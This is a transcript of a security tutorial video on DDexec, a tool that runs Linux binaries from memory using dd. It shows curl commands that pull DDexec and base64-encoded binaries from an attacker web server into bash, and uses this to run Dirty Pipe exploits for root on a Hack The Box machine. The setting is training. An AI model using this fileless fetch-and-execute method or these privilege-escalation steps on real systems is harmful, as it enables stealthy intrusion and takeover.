 what's going on youtube so this is a clip i recorded after doing a live stream with carlos the creator of hack tricks privilege escalation script awesome suite and now purple panda which is a tool for assessing the cloud and his friend yago who is just a reverse engineering wizard he created the script dd exec which allows us to use the dd binary to essentially exploit itself and execute other linux binaries so i want to do a quick video just highlighting how to use the script and how i would use it to do boxes because it allows us to execute exploits such as dirty pipe without ever dropping that l file on the box itself it just curl it and execute straight from memory it's really cool so let's jump in before we get into anything too technical i want to highlight that reflectively executing all files out of memory isn't exactly new if i just go to ipsec.rocks type memory elf you come to this nightmare v2 video which is from like 2018 so four years ago we showcased it and i think it used this blog post which i believe uses like perl and python to do a mfd create write potentially fork it and exec execute this method works really well the one thing that i really like about we're going to show in this video this dd exec if we go all the way to the top by argut 13 is it's a living off the land method so it uses the binary dd to um exploit itself essentially and get code execution so it's pretty cool um it only requires these binaries be on the box the one that may not be as dd everything else is pretty like standard but i have seen like containers that don't have python or pearl installed because they're very minimal but it probably has dd installed and has everything else installed as well so i really like this technique the main reason i'm creating this video is um i think the example he has on the site it's kind of hard to i um like weaponize it if you don't know something called process substitution which this video is pretty much going to showcase so um let's get into this let's just get clone this and we'll walk over the steps so hopefully people can understand it so if i go into dd exec we can copy his example and we see it's going to base64 encode bin ls pipe it into dd exec and then this is just sysarcv and in linux the very first thing is going to be i want to say file name maybe process name i don't know exactly what it's called but this is what's going to show up if you look at like the output of ps and this is the argument so we just did lsla um i think if i add like an n n we can see slightly different things instead of like my username is now id to prove it all works in order to show what it looks like in a ps output it's probably easier to change this to sleep so where is sleep user been sleep so instead of ls i'm going to do sleep i'm going to sleep for 60 seconds and i'm going to call this please subscribe right so now if i do a ps ef forest we can see it easily right here um bash to dd exec and it's executing bin please subscribe and if i less ls this file it's not going to exist because it's in memory and then for 60 seconds if i looked at like the proc directory ls slash proc this pid la you can see it's executable is set to just bash i'm sure if we extracted the heap we would see the actual sleep binary here if you don't know how to do that i'd go to ipsec.rocks and search for um let's see forensics linux here we go this video basic linux memory forensics um showcases all that type of stuff but that would probably take too long to include in this video so uh the issue i have with this now is the main reason of this is we want to run an l file on our target without touching disk and right now it requires the alpha to be there because we got a base 60 for it and the reason why we do this is we're patching it in a argument and if there's a null byte which there's always going to be for an l file it's going to terminate that string so badness happens that's why we base 64. so number one we'd have to update upload the elf there number two the issue is um we also have to have dd exec on the um box however we can use like process substitution to remove that and process substitution is really cool i think it's like one of the things i didn't really know about until i did this but if i do less on who am i this isn't going to work because this is just doing process execution it's going to execute who am i and pass the results to that which is ipsec to the less binary so if i did like echo please subscribe to ipsec then now this less command is going to translate to ipsec which is a file on disk and we can read it that shouldn't really be a surprise so i removed it and there we have it so the process substitution we change this dollar to a less than sign and now it's going to run this command and send it to less itself so um it's a file descriptor right here if i do dash f so less can view file descriptors we have ipsec right now it's devfd63 right so what this allows us to do is if we go back to our dd exec command we can now put curl here right so we could do curl 10 10 14 8 we can do port 8 000 dd exec dot sh so now bash will be executing dd exec.sh and all we have to do here is [Music] have base64 so let's go and do ls again so i'm going to make dur dub dub dub we'll go into that and i'm going to base64 w0 bin ls to ls.b64 and we also want to copy dd exec here so cp.ddexact and then ddexec.sh to this directory so we have two files here python3 dash m http.server and over here we can curl right so i can do a curl 1010 14 8 8 000 ls.b64 and when we run this we can see it gets dd exec and gets ls and i still have 60 here because that's when i was using sleep but if i add a la uh we should have the normal ls output we're used to so now we can combine this and take something like dirty pipe and run dirty pipe on a target system without touching disk so i'm going to ssh into altered this is a box i had created for the ultimate hacking championship it now exists on hack the box and i'm going to type the password i know because i created the box i hope i typed it right there we have it so this is vulnerable to dirty pipe so let's go and download the exploit so dirty pipe go to google and we'll just do this one for basic proof of concept we'll probably do the three i show in my video for altered because i think doing all three um makes a lot of sense so i'm going to v dirty pipe.c paste it in gcc it out we'll just call it dirty pipe and then we have to base64 it's a base64 dirty pipe uh w0 and dirty pipe dot b64 now this particular exploit uh requires us to say target file the offset and what we want to write against it right so i'm going to start up my python 3 web server and i'm going to go to where this curl command is and let's see so i'm going to have this to be dirty dirtypipe.b64 and we're going to say [Music] actually before i do this we should look at the contents of passwd because i don't think i reverted this box so uh something weird is going to be here um tail dash one uh should do head head dash one yeah um this has already been exploited but all we want to do is change this o to be a capital l so it doesn't really matter for this i'm going to do etsy pass wd the offset of 1 and i'm going to put it as a capital o and then we're gonna view that so that is offset one right there we can see the two um downloads here dirty pipe is running and um i made a mistake i only pass it a few arguments because i didn't put the actual file name here so let's do bin please subscribe so now we'll rerun it um once this finishes it says it worked if i had dash one we can see we overwrote that file um if i go here we can say github dirty pipe um do i have one let's see is this one i think this one's it i think exploit one is going to be the one that we see here that puts aaron right uh maybe not i'm going to google dirty pipe github aaron run this so i think this is the one that was ran on the box because it's going to write the passwd thing here right so i'm going to replace this command so we're going to write a password of ipsec so we know it actually worked so if i go back here let's do www w get and then exploit.c uh that's not what i want i want raw so i go up here raw rm exploit w get and now we can search for aaron and i should have just grabbed aaron on exploit.c and i'm going to copy this and we'll should put the salt as ipsac and the password as hip sec there we go so now we'll know if this exploit worked um this may actually not work it's going to really screw with the passwd file it's one of the things i hate about this exploit but we'll see what happens thankfully this is hack the box where we're doing this to learn so see but this uh they added a backslash n at the end right i actually just want to edit this hash there we go so now we are replacing the password with ipsec and hoping this works right gcc exploit.c and i'm going to call this um [Music] d-pipe sure base64-w0 d-pipe and we'll put it to d pipe.b64 and again we're looking at this we want to reset passwd so i'm putting a lowercase o there now let this run okay so let's change this binary instead of dirtypipe.b64 we called it d-pipe.b64 and hopefully it changes the password to be ipsec um if i head dash one the file we do see it looks like this works if i like head dash three because this is a like file right where we um insert data we don't append it we overwrite data you can see like a passwd file is all sorts of screwed up right but if i did smu dash and type oh well i can't because this box i have a module on called pamwortle so in order to run the su command you have to play a game of wordle that has a hacking dictionary let's try hacks here so i know it has an h and it ends in k um i don't exactly know the dictionary of my head oh it doesn't end in k um has a k here but i'm not going to play the game we're just going to say a bunch of words so you can see what the word is and we're going to do another way around it so that word was cmake and if i put the password of ipsec here it's not going to work um let's pop this box another way and i think okay i don't have it i thought i may have um had a second private already on this but i don't so let's do something that modifies a set uid thing to create another set uid called temp sh that is bash so if we go back to dirty pipe let's go to a google dirty pipe github and let's see we don't want aaron right we want like exploit two i'm going to add set uid to my search here we go this one's going to overwrite a set uid file so i'm going to raw so we can download this wget and let's just gcc it so gcc exploit 2 o i'll call it dp dash set uid and then we can see the arguments of this we just give it the set uid binary you want to use so that's good base64-w 0 and we direct this to a file so dp set uid.b64 and over here we can do a curl dp dash um setuid.b64 and i'm going to use the pk exec binary because that is set uid and it's got a little bit of flair to it if we use pk exec to privace with dirty pipe because pk exec itself had a vulnerability not too long ago but here we go um we executed dirty pipe and got root without even um like touching disk so i find that to be really cool and we'll just end this video with playing a game of hacker wordle and of course cheating because again it's hacker wordle so you have to cheat right so v words um there we go and if i do s u dash let's do opsec is the password so we know we have an s n so i'm going to grab s on words um i'm going to try shell we want to grab begins with uh where is that there we go so it's one of three uh two things shmdt and that's correct so password of ipsec because that's what we changed it to and again we are rude so hope you guys enjoyed this short video on dd exec take care and i will see you all next time